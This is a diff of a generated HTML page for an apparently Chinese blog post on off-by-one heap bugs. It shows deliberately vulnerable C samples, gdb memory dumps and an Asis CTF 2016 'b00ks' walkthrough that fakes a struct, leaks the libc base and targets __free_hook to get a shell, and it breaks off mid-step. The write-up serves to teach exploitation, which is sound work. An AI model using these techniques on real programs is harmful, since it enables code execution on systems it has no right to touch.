@@ -142,18 +142,6 @@
         </div>
         <div class="bottom">
           <div class="follow">
-            
-            <a href="https://github.com/shixiaohu2206" target="_block">
-              <span class="iconfont icon-github"></span>
-            </a>
-            
-            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
-              <span class="iconfont icon-facebook"></span>
-            </a>
-            
-            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
-              <span class="iconfont icon-instagram"></span>
-            </a>
              
             <a href="/atom.xml" target="_block">
               <span class="iconfont icon-rss"></span>
@@ -175,6 +163,11 @@
           <span>2019/10/10</span>
         </span>
 
+        
+          <span class="item leancloud-visitors" id="/2019/10/10/Off-By-One学习/" data-flag-title="Off-By-One学习">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
         
 
          
@@ -222,61 +215,163 @@
 <li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得<code>prev_in_use</code>位被清，这样前块会被认为是 free 块。(1) 这时可以选择使用 unlink 方法进行处理。(2) 另外，这时<code>prev_size</code>域就会启用，就可以伪造<code>prev_size</code>，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照<code>prev_size</code>找到块的后一块（理论上是当前正在unlink的块）与当前正在 unlink 的块大小是否相等。</li>
 </ol>
 <p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span>
+    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;
+      prevsize = prev_size (p);
+      size += prevsize;
+      p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));
+      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span>
+      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))
+        malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size while consolidating"</span>);
+      unlink_chunk (av, p);
+    &#125;</code></pre>
 
-<h3 id="示例1">示例1<a class="post-anchor" href="#示例1"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input:"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="示例1">示例1<a class="post-anchor" href="#示例1"></a></h3><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">my_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ptr,<span class="hljs-keyword">int</span> size)</span>
+</span>&#123;
+    <span class="hljs-keyword">int</span> i;
+    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)
+    &#123;
+        ptr[i]=getchar();
+    &#125;
+    <span class="hljs-keyword">return</span> i;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>&#123;
+    <span class="hljs-keyword">void</span> *chunk1,*chunk2;
+    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);
+    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input:"</span>);
+    my_gets(chunk1,<span class="hljs-number">16</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre>
 
 <p>我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了依次，这也被称为栅栏错误</p>
 <p>我们使用gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16 字节的堆块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
+0x602030:   0x0000000000000000  0x0000000000000000</code></pre>
 
 <p>当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+0x602010:   0x4141414141414141  0x4141414141414141
+0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2
+0x602030:   0x0000000000000000  0x0000000000000000</code></pre>
 
 <h3 id="实例2">实例2<a class="post-anchor" href="#实例2"></a></h3><p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>&#123;
+    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">""</span>;
+    <span class="hljs-keyword">void</span> *chunk1;
+    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input"</span>);
+    gets(buffer);
+    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)
+    &#123;
+        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre>
 
 <p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。<br>但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。<br>strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021
+0x602010:   0x4141414141414141  0x4141414141414141
+0x602020:   0x4141414141414141  0x0000000000000400</code></pre>
 
 <p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。<br>还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">DWORD 0x41424344
+内存  0x44,0x43,0x42,0x41</code></pre>
 
 <h3 id="实例1–-Asis-CTF-2016-b00ks">实例1– Asis CTF 2016 b00ks<a class="post-anchor" href="#实例1–-Asis-CTF-2016-b00ks"></a></h3><p><strong>题目介绍</strong></p>
 <p>题目是一个常见的菜单式程序，功能是一个图书管理系统。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Create a book</span><br><span class="line"><span class="number">2.</span> Delete a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change current author name</span><br><span class="line"><span class="number">6.</span> Exit</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-number">1.</span> Create a book
+<span class="hljs-number">2.</span> Delete a book
+<span class="hljs-number">3.</span> Edit a book
+<span class="hljs-number">4.</span> Print book detail
+<span class="hljs-number">5.</span> Change current author name
+<span class="hljs-number">6.</span> Exit</code></pre>
 
 <p>题目提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : No</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : Yes</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Full</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">Canary                        : No
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Full</code></pre>
 
 <p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>
+&#123;</span>
+    <span class="hljs-keyword">int</span> id;
+    <span class="hljs-keyword">char</span> *name;
+    <span class="hljs-keyword">char</span> *description;
+    <span class="hljs-keyword">int</span> size;
+&#125;</code></pre>
 
 <p><strong>create</strong></p>
 <p>book 结构中存在 name 和 description，name 和 description 在堆上分配。首先分配 name buffer，使用malloc。大小自定但小于 32.</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;size);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter book name (Max 32 chars): "</span>, &amp;size);</span><br><span class="line">ptr = <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;size);
+__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>, &amp;size);
+ptr = <span class="hljs-built_in">malloc</span>(size);</code></pre>
 
 <p>之后分配 description ，同样大小自定但无限制。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;size);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">v5 = <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;size);
+__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);
+
+v5 = <span class="hljs-built_in">malloc</span>(size);</code></pre>
 
 <p>之后分配 book 结构的内存</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">book = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)book + <span class="number">6</span>) = size;</span><br><span class="line">    *((_QWORD *)off_202010 + v2) = book;</span><br><span class="line">    *((_QWORD *)book + <span class="number">2</span>) = description;</span><br><span class="line">    *((_QWORD *)book + <span class="number">1</span>) = name;</span><br><span class="line">    *(_DWORD *)book = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp">book = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);
+<span class="hljs-keyword">if</span> ( book )
+&#123;
+    *((_DWORD *)book + <span class="hljs-number">6</span>) = size;
+    *((_QWORD *)off_202010 + v2) = book;
+    *((_QWORD *)book + <span class="hljs-number">2</span>) = description;
+    *((_QWORD *)book + <span class="hljs-number">1</span>) = name;
+    *(_DWORD *)book = ++unk_202024;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
+&#125;</code></pre>
 
 <p><strong>漏洞</strong></p>
 <p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(_BYTE *ptr, <span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; --》 漏洞位置</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">my_read</span><span class="hljs-params">(_BYTE *ptr, <span class="hljs-keyword">int</span> number)</span>
+</span>&#123;
+  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>
+  _BYTE *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="hljs-keyword">if</span> ( number &lt;= <span class="hljs-number">0</span> )
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
+  buf = ptr;
+  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )
+  &#123;
+    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1u</span>LL) != <span class="hljs-number">1</span> )
+      <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;
+    <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-string">'\n'</span> )
+      <span class="hljs-keyword">break</span>;
+    ++buf;
+    <span class="hljs-keyword">if</span> ( i == number )
+      <span class="hljs-keyword">break</span>;
+  &#125;
+  *buf = <span class="hljs-number">0</span>; --》 漏洞位置
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
+&#125;</code></pre>
 
 <h4 id="利用">利用<a class="post-anchor" href="#利用"></a></h4><p>创建两个<code>b00k</code>, 在<code>first b00k</code>中伪造<code>b00k</code>进而控制<code>second b00k</code>的<code>description</code>指针, 将该指针改为<code>__free_hook</code>, 修改<code>second b00k</code>的<code>description</code>为<code>execve(&quot;/bin/sh&quot;)</code>, 最后<code>free</code></p>
 <p><strong>泄露</strong></p>
 <p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p>
 <p>books 位置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        0x55865b7c9040:    0x4141414141414141    0x4141414141414141</span><br><span class="line">        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --&gt; author</span><br><span class="line">b00ks&lt;--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">        0x55865b7c9040:    0x4141414141414141    0x4141414141414141
+        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --&gt; author
+b00ks&lt;--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000</code></pre>
 
 <p>null byte overflow</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x55865b7c9040:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55865b7c9050:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55865b7c9060:    0x000055865cc0d100(0x60--&gt;0x00)    0x000055865cc0d190</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x55865b7c9040:    0x4141414141414141    0x4141414141414141
+0x55865b7c9050:    0x4141414141414141    0x4141414141414141
+0x55865b7c9060:    0x000055865cc0d100(0x60--&gt;0x00)    0x000055865cc0d190</code></pre>
 
 <p><strong>1. 创建第一个firest book</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--&gt; Name</span><br><span class="line">0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--&gt; Name
+0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)</code></pre>
 
 <p>当<code>0x55f276c74160 --&gt; 0x55f276c74100</code>时, <code>0x55f276c74100</code>正好落在<code>first b00k</code>的<code>description</code>中, 属于可控范围, 为我们伪造<code>b00k</code>打下了基础.</p>
 <p><strong>2. leak book1 addr</strong></p>
@@ -285,25 +380,45 @@
 <p><strong>3. 申请 book2</strong></p>
 <p>book2的description的大小越大越好(如0x21000)，这样会通过mmap()函数去分配堆空间，而该堆地址与libc的基址相关，这样通过泄露该堆地址可以计算出libc的基址。</p>
 <p><strong>4. 伪造book</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x55f276c740c0:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55f276c740d0:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55f276c740e0:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55f276c740f0:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55f276c74100:    0x0000000000000001    0x000055f276c74198----</span><br><span class="line">0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |</span><br><span class="line">......                                                   |</span><br><span class="line">0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |</span><br><span class="line">0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |</span><br><span class="line">0x55f276c74180:    0x0000000000000000    0x0000000000000031   |</span><br><span class="line">0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 &lt;-|</span><br><span class="line">0x55f276c741a0:    0x00007f282b8c5010    0x0000000000021000</span><br><span class="line">0x55f276c741b0:    0x0000000000000000    0x0000000000020e51</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x55f276c740c0:    0x4141414141414141    0x4141414141414141
+0x55f276c740d0:    0x4141414141414141    0x4141414141414141
+0x55f276c740e0:    0x4141414141414141    0x4141414141414141
+0x55f276c740f0:    0x4141414141414141    0x4141414141414141
+0x55f276c74100:    0x0000000000000001    0x000055f276c74198----
+0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |
+......                                                   |
+0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |
+0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |
+0x55f276c74180:    0x0000000000000000    0x0000000000000031   |
+0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 &lt;-|
+0x55f276c741a0:    0x00007f282b8c5010    0x0000000000021000
+0x55f276c741b0:    0x0000000000000000    0x0000000000020e51</code></pre>
 
 <p>可以看到<code>0x55f276c74100</code>已经是<code>fake b00k1</code></p>
 <p><strong>5. 空字节覆盖 leak book2 name pointer&amp;libcbase</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x55f275d55040:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55f275d55050:    0x4141414141414141    0x4141414141414141</span><br><span class="line">0x55f275d55060:    0x000055f276c74100    0x000055f276c74190</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x55f275d55040:    0x4141414141414141    0x4141414141414141
+0x55f275d55050:    0x4141414141414141    0x4141414141414141
+0x55f275d55060:    0x000055f276c74100    0x000055f276c74190</code></pre>
 
 <p>泄露的是<code>second b00k</code>的<code>name pointer</code>和<code>description pointer</code>.<br>这个指针和libc base address是有直接联系的.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x000055f276c73000 0x000055f276c95000 rw-p    [heap]</span><br><span class="line">0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x000055f276c73000 0x000055f276c95000 rw-p    [heap]
+0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so</code></pre>
 
 <p>  <code>offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010</code><br>  <strong>结论:</strong> 通过伪造的<code>b00k</code>, 我们泄露了 <code>libc base address</code>.</p>
 <p>**6. 获取相关指针</p>
 <p>主要是两个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbase</span><br><span class="line">execve_addr = libcbase + 0x4526a</span><br></pre></td></tr></table></figure>
